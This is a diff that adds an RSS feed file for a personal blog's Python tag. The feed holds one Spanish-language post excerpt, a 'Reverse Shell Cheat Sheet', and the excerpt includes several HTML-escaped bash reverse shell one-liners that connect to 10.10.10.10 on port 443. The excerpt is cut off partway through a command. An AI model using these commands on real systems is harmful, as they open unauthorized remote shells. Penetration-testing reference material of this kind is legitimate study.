@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Python on Taurus Omar</title>
+    <link>https://taurusomar.github.io/tags/python/</link>
+    <description>Recent content in Python on Taurus Omar</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>whoami@taurusomar.com (Taurus Omar)</managingEditor>
+    <webMaster>whoami@taurusomar.com (Taurus Omar)</webMaster>
+    <copyright>©2021, All Rights Reserved</copyright>
+    <lastBuildDate>Thu, 14 Oct 2021 01:02:31 -0500</lastBuildDate>
+    
+        <atom:link href="https://taurusomar.github.io/tags/python/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Reverse Shell Cheat Sheet</title>
+        <link>https://taurusomar.github.io/posts/reverse-shell/</link>
+        <pubDate>Thu, 14 Oct 2021 01:02:31 -0500</pubDate>
+        <author>whoami@taurusomar.com (Taurus Omar)</author>
+        <atom:modified>Thu, 14 Oct 2021 01:02:31 -0500</atom:modified>
+        <guid>https://taurusomar.github.io/posts/reverse-shell/</guid>
+        <description>En este post estan posiblemente las mejores formas de obtener una reverse shell segun mi experiencia, y algunas de ellas son experimentos mios que estan funcionado, de la misma manera me pase recolectando unas cuentas formas mas para poder obtener una conexión reversa posiblemente sea la mejor lista practica de como entablar una reverse shell.
+Bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1 bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot; 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/443; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 bash -l &amp;gt; /dev/tcp/10.</description>
+        
+        <dc:creator>Taurus Omar</dc:creator>
+        <media:content url="https://taurusomar.github.io/https://i.imgur.com/5ka8TiS.jpg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Netcat</category>
+            
+          
+            
+              <category>Python</category>
+            
+          
+            
+              <category>Bash</category>
+            
+          
+            
+              <category>Php</category>
+            
+          
+        
+        
+          
+            
+              <category>Reverse Shell</category>
+            
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
